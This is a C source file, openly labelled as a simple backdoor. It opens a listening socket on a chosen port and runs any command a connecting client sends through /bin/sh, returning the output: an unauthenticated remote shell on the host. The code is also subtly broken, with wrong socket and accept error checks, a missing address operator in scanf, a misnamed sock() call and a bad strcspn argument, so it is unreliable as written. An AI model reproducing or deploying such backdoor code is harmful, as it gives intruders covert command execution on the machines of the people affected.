//Simple backdoor with handle_client by riugxss

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define BUFFER 1024


void handle_client(int client_add){
    char buffer[BUFFER];
    ssize_t bytes;

    while (1){
        send(client_add, "shell>", 7, 0);
        memset(buffer, 0, BUFFER);
        bytes = recv(client_add, buffer, BUFFER -1, 0);
        if (bytes < 0){
            perror("Error with client connection");
            break;
        }
        buffer[strcspn(buffer, '\n')] = '\0';

        if (strcmp(buffer, "exit") == 0){
            printf("Connection closed by the client");
            break;
        }

        pid_t pid;
        pid = fork();
        if (pid == 0){
            dup2(client_add, STDOUT_FILENO);
            dup2(client_add, STDERR_FILENO);
            close(client_add);
            execl("/bin/sh", "sh", "-c", buffer, 0);

            perror("Error with the shell commands");
            exit(EXIT_FAILURE);
        } else if (pid > 0){
            wait(NULL);
        } else {
            perror("Error with the fork");
        }

    }
    close(client_add);
}

int main(){
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    size_t clientlen = sizeof(client_addr);
    int PORT;

    printf("Enter the port: ");
    scanf("%d", PORT);

    if (PORT < 0 || PORT > 65535){
        perror("Invalid port [!]");
        return 1;
    }

    server_sock = sock(AF_INET, SOCK_STREAM, 0);
    if (server_sock != 0){
        perror("Error creation the socket");
        return 1;
    }
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);

    if (bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) != 0){
        perror("Error binding the port with the socket");
        close(server_sock);
        return 1;
    }
    printf("Connection succeded");

    if (listen(server_sock, 1) == -1 ){
        perror("Listening on port: %d failed", PORT);
        close(server_sock);
        return 1;
    }
    printf("Backdoor listening on port: %d", PORT);

    client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &clientlen);
    if (client_sock != 0){
        perror("Failed connection with the sock client");
        close(server_sock);
        return 1;
    }   

    printf("Connection accepted by: %s:%d", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

    handle_client(client_sock);
    close(server_sock);
    return 0;
}
